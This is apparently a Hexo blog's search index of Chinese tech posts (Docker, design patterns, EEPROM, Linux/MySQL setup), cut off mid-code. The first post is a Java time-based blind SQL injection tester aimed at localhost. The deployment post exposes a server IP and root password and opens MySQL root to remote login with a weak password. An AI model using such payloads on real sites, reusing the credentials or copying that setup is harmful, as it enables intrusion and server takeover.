<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java简单延时注入程序</title>
      <link href="/2020/05/24/java-jian-dan-yan-shi-zhu-ru-cheng-xu/"/>
      <url>/2020/05/24/java-jian-dan-yan-shi-zhu-ru-cheng-xu/</url>
      
        <content type="html"><![CDATA[<pre><code>package com.secsail;import java.io.IOException;import java.net.URLEncoder;import org.apache.http.HttpEntity;import org.apache.http.client.ClientProtocolException;import org.apache.http.client.methods.CloseableHttpResponse;import org.apache.http.client.methods.HttpGet;import org.apache.http.impl.client.CloseableHttpClient;import org.apache.http.impl.client.HttpClientBuilder;import org.apache.http.util.EntityUtils;public class Main {    public static void main(String[] args) throws ClientProtocolException, IOException {        long starTime = System.currentTimeMillis();        String payload = URLEncoder.encode(&quot;if(length(database())&gt;=9,sleep(5),sleep(0))&quot;, &quot;utf-8&quot;);        // 开启debug调试//        System.setProperty(&quot;org.apache.commons.logging.Log&quot;, &quot;org.apache.commons.logging.impl.SimpleLog&quot;);//        System.setProperty(&quot;org.apache.commons.logging.simplelog.showdatetime&quot;, &quot;true&quot;);//        System.setProperty(&quot;org.apache.commons.logging.simplelog.log.org.apache.http&quot;, &quot;debug&quot;);        CloseableHttpClient httpClient = HttpClientBuilder.create().build();        HttpGet httpGet = new HttpGet(&quot;http://localhost/sql.php?id=&quot;+payload);        CloseableHttpResponse response = httpClient.execute(httpGet);        HttpEntity entity = response.getEntity();        String text = EntityUtils.toString(entity, &quot;UTF-8&quot;);        System.out.println(text);        if (response != null) {            response.close();        }        if (httpClient != null) {            httpClient.close();        }        long endTime = System.currentTimeMillis();        double responseTime = ((endTime - starTime) /1000d);        if (responseTime &gt; 5d) {            System.out.println(&quot;延时注入&quot;);        }        System.out.println(&quot;+=用时：&quot;+((endTime - starTime) /1000d) +&quot;秒&quot;);    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker 常用操作</title>
      <link href="/2020/05/24/docker-chang-yong-cao-zuo/"/>
      <url>/2020/05/24/docker-chang-yong-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h2 id="1、镜像操作"><a href="#1、镜像操作" class="headerlink" title="1、镜像操作"></a>1、镜像操作</h2><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>检索</td><td>docker search 关键字<br>eg: docker search mysql</td><td>我们经常去docker hub上检索镜像的详细，如镜像的TAG(版本)。</td></tr><tr><td>拉取</td><td>docker pull 镜像名:tag</td><td>:tag是可选的，tag表示标签，多为软件版本，默认是latest最新版本</td></tr><tr><td>列表</td><td>docker images</td><td>查看所有本地镜像</td></tr><tr><td>删除</td><td>docker rmi image-id</td><td>删除指定的本地镜像</td></tr></tbody></table><p>2、运行镜像</p><hr><pre class=" language-docker"><code class="language-docker">docker images 查看镜像列表docker run <span class="token punctuation">-</span>d <span class="token punctuation">-</span>p 8080<span class="token punctuation">:</span>8080 <span class="token punctuation">-</span><span class="token punctuation">-</span>name mytomcat 镜像id<span class="token punctuation">-</span>d 指定容器运行与前台还是后台，默认为false<span class="token punctuation">-</span>p 指定容器暴露端口，映射一个端口</code></pre><h2 id="3、使用docker-exec进入Docker容器"><a href="#3、使用docker-exec进入Docker容器" class="headerlink" title="3、使用docker exec进入Docker容器"></a>3、使用docker exec进入Docker容器</h2><h3 id="一、先使用命令docke"><a href="#一、先使用命令docke" class="headerlink" title="一、先使用命令docke"></a>一、先使用命令docke</h3><p>docker ps 查看正在运行的进程<br>docker exec -it 进程id /bin/bash 进入   </p><pre><code>-i 打开STDIN，用于控制台交互    -t 分配tty设备, 该可以支持终端登录，默认为false    </code></pre><p>操作完成 执行exit退出    </p><h3 id="二、拷贝本地文件到容器中"><a href="#二、拷贝本地文件到容器中" class="headerlink" title="二、拷贝本地文件到容器中"></a>二、拷贝本地文件到容器中</h3><pre class=" language-shell"><code class="language-shell">docker cp 本地文件 /容器中目录位置docker cp /www/runoob 96f7f14e99ab:/www</code></pre><h3 id="保存修改后的docker镜像"><a href="#保存修改后的docker镜像" class="headerlink" title="保存修改后的docker镜像"></a>保存修改后的docker镜像</h3><p>docker的镜像的状态是临时，每次启动都会是一个新的，所以我们要保存这个镜像</p><pre><code>docker commit -m &#39;fun&#39; 运行时id 镜像的名称</code></pre><h3 id="删除一个镜像"><a href="#删除一个镜像" class="headerlink" title="删除一个镜像"></a>删除一个镜像</h3><pre><code>docker rmi 镜像id</code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>领域模型</title>
      <link href="/2020/05/24/ling-yu-mo-xing/"/>
      <url>/2020/05/24/ling-yu-mo-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="领域模型是什么？"><a href="#领域模型是什么？" class="headerlink" title="领域模型是什么？"></a>领域模型是什么？</h2><p>领域模型是一种分析模型，在软件开发过程分析阶段用于分析如何满足系统功能性需求，属于软件开发范畴，在UML中主要使用类图来描述领域模型。<br>ps: UML图是对领域模型的描述</p><p>业务模型是业务剑魔的输出物，业务建模研究的对象是公司或者组织、业务剑魔属于软件开发过程中的初始阶段。</p><p>软件开发过程：业务建模、需求、分析、设计。  </p><h2 id="领域模型的作用"><a href="#领域模型的作用" class="headerlink" title="领域模型的作用"></a>领域模型的作用</h2><p>领域模型作用：</p><ul><li>分析如何满足系统功能性需求。</li><li>知道项目后续的系统设计。</li></ul><h5 id="业务模型作用："><a href="#业务模型作用：" class="headerlink" title="业务模型作用："></a>业务模型作用：</h5><p>帮助系统需求人员立即客户公司业务，下一阶段做需求以业务模型为输入得到系统用例</p><h2 id="领域模型与业务模型的区别"><a href="#领域模型与业务模型的区别" class="headerlink" title="领域模型与业务模型的区别"></a>领域模型与业务模型的区别</h2><h5 id="理论派"><a href="#理论派" class="headerlink" title="理论派"></a>理论派</h5><ul><li>领域模型是一种特殊的业务模型，所具备业务模型的所有特点，但是比业务模型更抽象，更通用   <h5 id="实战派"><a href="#实战派" class="headerlink" title="实战派"></a>实战派</h5></li><li>产生阶段不同<br>业务模型是在软件开发过程中业务建模阶段产生，领域模型实在分析阶段产生。</li><li>作用不同<br>业务模型是系统需求人员理解客户公司业务的产物，下一截断需求讲以业务模型输入得到系统需求  </li></ul><p>领域模型是系统分析人员分析如何满足系统功能性需求的产物。下一阶段设计将以领域模型为输入。</p><p>PS: 在软件开发中领域模型以业务模型和需求产生的</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
          <category> 领域模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 领域模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EEPROM断电存储</title>
      <link href="/2020/05/24/eeprom-duan-dian-cun-chu/"/>
      <url>/2020/05/24/eeprom-duan-dian-cun-chu/</url>
      
        <content type="html"><![CDATA[<p>EEPROM就是electrically erasable, programmable, read-only Memory</p><p>是一种电可擦除可编程只读存储器,并且内容在掉电时也不会丢失。EEPROM可以在不使用文件和文件系统的情况下用来固化一些数据，比如保存SSID和Password，设置和配置的信息。  </p><p>就是说如果你想断电后还保存一些参数，配置信息等, 就需要使用EEPROM</p><h5 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数:"></a>常用函数:</h5><pre>begin(size)  用于申请具体大小的ram内存空间，并发flash中读取相应数据到内存      返回值： 无      注意点：size必须大于0      虽然我们可以输入自定义size，但是最终会经过计算得到真正的size（4的倍数），并申请对应的内存空间  write(address, value) 用于往内存空间写入数据    address：要写入的地址位置，取值范围为内存空间的地址0~size    val：写入的数据。    返回值： 无    注意点：写入的数据只是写入到申请的内存空间，并不是立刻写入到flash中    EEPROM其实是从外部flash中存储器最末尾开辟的4096字节空间    【write只写一个字节的数据，所以数据的值应该在0~255之间，超过255的数据写入就不正确了】read(address)    该功能用于读取数据操作    address：要读取的地址位置，取值范围为内存空间的地址0~size      返回值： 返回存储数据    注意点：读取的数据也是从begin中生成的内存空间中去获取，并不会直接操作flash      【read只读一个字节的数据】commit()    该功能用于把内存空间的数据覆盖到flash eeprom块去      参数： 无；    返回值： 返回bool值，表示是否覆盖成功；    注意点：这个方法才是真正的把数据从内存控件写回到flash空间;    而且，写回flash之前会把整一块sector全部擦除掉，也就意味着就算我们begin(1)最终也是会擦除4096字节空间。但是size的大小决定了内存空间的剩余量以及回写的快慢，所以根据具体情况来设置sizeend()    该功能用于写入flash，并且释放内存空间参数： 无返回值： 无注意点：end包含了写入flash，并且回收内存空间建议读者操作完EEPROM之后，必须调用这个方法，回收内存空间很重要</pre><p>记录上电次数程序代码:</p><pre class=" language-arduino"><code class="language-arduino">#include <EEPROM.h>int address = 0; // 应用EEPROM地址为1int value = 0; 计数器void setup() {  Serial.begin(9600); // 波特率 9600  EEPROM.begin(512); // 申请内存并读取flash中相应的数据到内存  delay(1000); // 延迟1秒，测试时发现如果没有这一秒的延迟，计数器会加两次，不知道为什么！  getValue(); // 先从address内存中读取一个字节的数据  setValue(); // 将数据写入到address内存中  while (!Serial) { // 等待串口监视器，当打开串口监视器时，程序会退出while循环, 开始loop()函数中的程序    ; // wait for serial port to connect. Needed for Leonardo only  }}void loop() {  getValue();  delay(1000);}void getValue() {    value = EEPROM.read(address); // 从address内存中读取一个字节的数据    Serial.println(value);}void setValue() {  value += 1;  EEPROM.write(address, value);  EEPROM.end(); //把数据写入flash,并释放内存}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 单片机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EEPROM断电存储 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux环境部署</title>
      <link href="/2020/05/24/linux-huan-jing-bu-shu/"/>
      <url>/2020/05/24/linux-huan-jing-bu-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="linux环境部署"><a href="#linux环境部署" class="headerlink" title="linux环境部署"></a>linux环境部署</h1><p>服务器信息:</p><pre><code>主机ID : 126046969 主机名称 : centos-4gb-beijing IPV4 : 101.36.152.44 内网 IP : 10.0.0.23 系统用户名 : root 密 码 : moVK64964b</code></pre><p><a href="http://www.sjsems.com" target="_blank" rel="noopener">www.sjsems.com</a></p><h2 id="一、连接工具"><a href="#一、连接工具" class="headerlink" title="一、连接工具"></a>一、连接工具</h2><p><strong>putty</strong><br>下载地址:<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="noopener">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></p><h2 id="一、安装JDK1-8"><a href="#一、安装JDK1-8" class="headerlink" title="一、安装JDK1.8"></a>一、安装JDK1.8</h2><ul><li>先从orcle官网下载下最新的JDK “jdk-8u231-linux-x64.tar.gz”</li><li>通过FTP工具的SSH连接方式，把文件传输到服务器上</li></ul><p><strong>先卸载默认的openjdk*</strong></p><pre><code></code></pre><p>1、新建java目录</p><pre><code>cd /usr/localmkdir java</code></pre><p>2、把”jdk-8u231-linux-x64.tar.gz”放到/usr/local/java</p><pre><code>cd /usr/local/javacp /root/jdk-8u231-linux-x64.tar.gz .</code></pre><p>2、配置环境变量</p><pre class=" language-shell"><code class="language-shell">vim /etc/profile# 文件最底部添加export JAVA_HOME=/usr/local/java/jdk1.8.0_231export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/bin</code></pre><p>3、查看是否安装成功</p><pre><code>java -version</code></pre><p><strong>如果java -verison没生效，可以使用下面命令</strong></p><pre class=" language-shell"><code class="language-shell">source /etc/profilejava -version</code></pre><h2 id="一、安装MySQL"><a href="#一、安装MySQL" class="headerlink" title="一、安装MySQL"></a>一、安装MySQL</h2><p>先从官网下载最新的社区版本的MySQL，因为centos是属于red hat下的,记得下载Red Hat Enterprise Linux / Oracle Linux，</p><ul><li>下载地址:<a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">https://dev.mysql.com/downloads/mysql/</a></li></ul><p><strong>mysql-8.0.18-1.el7.x86_64.rpm-bundle.tar</strong></p><p>1、新建目录</p><pre><code>cd /usr/local/mkdir mysql</code></pre><p>2、把“mysql-8.0.18-1.el7.x86_64.rpm-bundle.tar”放到/usr/local/mysql</p><pre><code>cd /usr/local/mysqlcp /root/mysql-8.0.18-1.el7.x86_64.rpm-bundle.tar .</code></pre><p>3、解压文件，解压完会得到很多.rpm的安装包</p><pre><code>tar -xvf mysql-8.0.18-1.el7.x86_64.rpm-bundle.tar</code></pre><p>4、安装</p><pre><code># linux都会自带一个默认的数据库，需要先卸载掉它# 1.查看当前是否有mariadbrpm -qa | grep mariadb# 2.有则卸载它rpm -e 上条命令查询出来的mariadb名称 --nodeps# 正式安装mysqlrpm -ivh mysql-community-common-8.0.18-1.el7.x86_64.rpm --nodeps --forcerpm -ivh mysql-community-libs-8.0.18-1.el7.x86_64.rpm --nodeps --forcerpm -ivh mysql-community-client-8.0.18-1.el7.x86_64.rpm --nodeps --forcerpm -ivh mysql-community-server-8.0.18-1.el7.x86_64.rpm --nodeps --force</code></pre><p>5、初始化mysql</p><pre><code>mysqld --initialize# 授权chown mysql:mysql /var/lib/mysql -R;# 启动mysqlsystemctl start mysqld.service;# 设置mysql为开启自启systemctl enable mysqld;</code></pre><p>6、设置防火墙规则</p><pre class=" language-shell"><code class="language-shell"># 检查防火墙是否工作状态systemctl status firewalld# 没有防火墙没启动则启动一下systemctl start firewalld;# 设置3306端口firewall-cmd --zone=public --add-port=3306/tcp --permanent# 应用配置firewall-cmd --reload</code></pre><p>6、查看mysql默认生成的密码，需要从日志中找</p><pre class=" language-shell"><code class="language-shell">cat /var/log/mysqld.log | grep password</code></pre><h1 id="执行完就会得到类似下面的信息-其中”QFCYu-rrH4-P”就是密码"><a href="#执行完就会得到类似下面的信息-其中”QFCYu-rrH4-P”就是密码" class="headerlink" title="执行完就会得到类似下面的信息,其中”QFCYu)rrH4.P”就是密码"></a>执行完就会得到类似下面的信息,其中”QFCYu)rrH4.P”就是密码</h1><pre><code>cat /var/log/mysqld.log | grep passwordQFCYu)rrH4.P</code></pre><p>7、登录到mysql</p><pre class=" language-shell"><code class="language-shell">mysql -uroot -p # 之后根据提示输入密码# 修改密码为applejamalter user 'root'@'localhost' identified by 'applejam';# 设置mysql,root用户可以远程连接use mysql;update user set host = '%' where user = 'root';# 更新设置flush privileges;</code></pre><p><strong>用navicat连接的时候可能会遇到密码规则的问题，可以使用下面命令解决</strong></p><pre class=" language-shell"><code class="language-shell">mysql -uroot -p # 之后根据提示输入密码use mysql;alter user 'root'@'%' identified with mysql_native_password by 'applejam';flush privileges;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> linux环境部署 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> linux环境部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作中的沟通交流</title>
      <link href="/2020/05/24/gong-zuo-zhong-de-gou-tong-jiao-liu/"/>
      <url>/2020/05/24/gong-zuo-zhong-de-gou-tong-jiao-liu/</url>
      
        <content type="html"><![CDATA[<h2 id="建立有效沟通的三要素"><a href="#建立有效沟通的三要素" class="headerlink" title="建立有效沟通的三要素"></a>建立有效沟通的三要素</h2><ul><li>一、目标</li><li>二、结果</li><li>三、把目标变成结果的实现过程</li></ul><blockquote><p>第一点：带着问题去思考，带着目标去沟通，沟通开始前一定要有确定目标<br>第二点：把目标变成过程，用心去琢磨，用什么的方式方法，传递你的思想和情感<br>第三点：沟通结束一定要有结果，即使结果很糟糕，也比没有结果强   </p></blockquote><h2 id="如何让对方听懂你在说什么"><a href="#如何让对方听懂你在说什么" class="headerlink" title="如何让对方听懂你在说什么"></a>如何让对方听懂你在说什么</h2><h2 id="一、往上沟通（领导）"><a href="#一、往上沟通（领导）" class="headerlink" title="一、往上沟通（领导）"></a>一、往上沟通（领导）</h2><ul><li>1.尽量不给上司出问答题，而是选择题</li><li>2.跟领导沟通一定要准备好对策或答案</li><li>3.优劣对比+可能结果</li></ul><h2 id="二、往下沟通（下属）"><a href="#二、往下沟通（下属）" class="headerlink" title="二、往下沟通（下属）"></a>二、往下沟通（下属）</h2><ul><li>1.了解状况（瓶颈）+ 反思</li><li>2.提供方法 + 紧盯过程</li><li>3.接受意见+共谋对策+给予尝试的机会</li></ul><h2 id="三、水平沟通（同事）"><a href="#三、水平沟通（同事）" class="headerlink" title="三、水平沟通（同事）"></a>三、水平沟通（同事）</h2><ul><li>1.主动+体谅+谦虚</li><li>2.自己先提供协助，在请求对方配合– 古人云：将欲取之，必先予之。</li><li>3.分析利弊+双赢结果</li></ul>]]></content>
      
      
      <categories>
          
          <category> 沟通交流 </category>
          
          <category> 工作经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沟通交流 </tag>
            
            <tag> 工作经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/2020/05/24/dan-li-mo-shi/"/>
      <url>/2020/05/24/dan-li-mo-shi/</url>
      
        <content type="html"><![CDATA[<p>定义:<br>&emsp;单例模式，是一种常用的软件设计模式，通过单例模式可以保证系统中一个类只有一个实例，即一个类只有一个对象实例。</p><p>特点:<br>&emsp; 1、单例类只有一个实例<br>&emsp; 2、单例类必须自己创建自己的唯一实例<br>&emsp; 3、单例类必须给所有其他对象提供这一实例   </p><p>单例模式的要点:<br>&emsp; 1、私有的构造方法<br>&emsp; 2、指向自己实例的私有静态引用<br>&emsp; 3、以自己实例为返回值的静态的共有的方法</p><p>饿汉式单例:<br>    饿汉式单例在单例类被加载时，就会实例化一个对象交给自己的引用</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 饿汉式单例模式 * @author Administrator * */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> Singleton singleton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Singleton <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> singleton<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>懒汉式单例:</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 懒汉式单例 * @author Administrator * */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton_02</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> Singleton_02 singleton_02<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">Singleton_02</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> Singleton_02 <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>singleton_02 <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            singleton_02 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton_02</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> singleton_02<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>双重锁形式:    </p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 双重锁单例 * @author Administrator * */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton_03</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">volatile</span> Singleton_03 instance <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">Singleton_03</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Singleton_03 <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>Singleton_03<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton_03</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>&emsp; 这个模式将同步的内容下方到if内部，提高了执行的效率，不必每次获取对象时都进行同步，只有第一次才同步，创建了以后就没必要了。面对高并发的情况，而采用懒汉模式，最好的选择就是双重判断加同步的方式</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
          <category> 六大设计原则 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>六大设计原则之接口隔离原则</title>
      <link href="/2020/05/24/liu-da-she-ji-yuan-ze-zhi-jie-kou-ge-chi-yuan-ze/"/>
      <url>/2020/05/24/liu-da-she-ji-yuan-ze-zhi-jie-kou-ge-chi-yuan-ze/</url>
      
        <content type="html"><![CDATA[<h2 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h2><p>1、接口尽量细化，化为最小功能单元<br>2、不使用的接口不要依赖<br>拆分接口首先要遵循单一职责原则</p><p>变动概率增加了，风险也就增加了</p><p>比如下面这个<font color=blue>UserController.saveOrUpdateUser()</font> 保存或修改，不管是保存还是修改只要有变动，就需要改动<font color=blue>saveOrUpdateUser()</font>方法，这样变动概率增加了，风险也就增加了</p><pre><code>@Controller@RequestMapping(&quot;/user&quot;)public class UserController {    // 原    @RequestMapping(&quot;/saveOrUpdateUser&quot;)    public String saveOrUpdateUser() {        return &quot;sucess&quot;;    }    // 拆分后    @RequestMapping(&quot;/saveUser&quot;)    public String saveUser() {        return &quot;success&quot;;    }    @RequestMapping(&quot;/updateUser&quot;)    public String updateUser() {        return &quot;success&quot;;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
          <category> 六大设计原则 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 六大设计原则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>六大设计原则之开闭原则</title>
      <link href="/2020/05/24/liu-da-she-ji-yuan-ze-zhi-kai-bi-yuan-ze/"/>
      <url>/2020/05/24/liu-da-she-ji-yuan-ze-zhi-kai-bi-yuan-ze/</url>
      
        <content type="html"><![CDATA[<h2 id="六大设计原则之开闭原则"><a href="#六大设计原则之开闭原则" class="headerlink" title="六大设计原则之开闭原则"></a>六大设计原则之开闭原则</h2><p>核心概念：对扩展开放，对修改关闭<br>策略：抽象约束、封装变化</p><p><strong>封装变化</strong>：<br>假设: 我们现在要增加一个“加载字体库”的动作，那么只需要在clickButton()中完成调用就可以了</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 小米手机 * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XiaomiPhone</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 点亮屏幕</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"点亮屏幕了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 加载操作系统</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作系统加载完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 搜索信号</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"信号搜索完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 开机</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>增加字体库加载</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 小米手机 * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XiaomiPhone</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 点亮屏幕</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"点亮屏幕了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 加载操作系统</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作系统加载完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 搜索信号</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"信号搜索完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 加载字体库</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadCharactor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字体库加载完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 开机</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadCharactor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 人 * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">openPhone</span><span class="token punctuation">(</span>XiaomiPhone phone<span class="token punctuation">)</span> <span class="token punctuation">{</span>        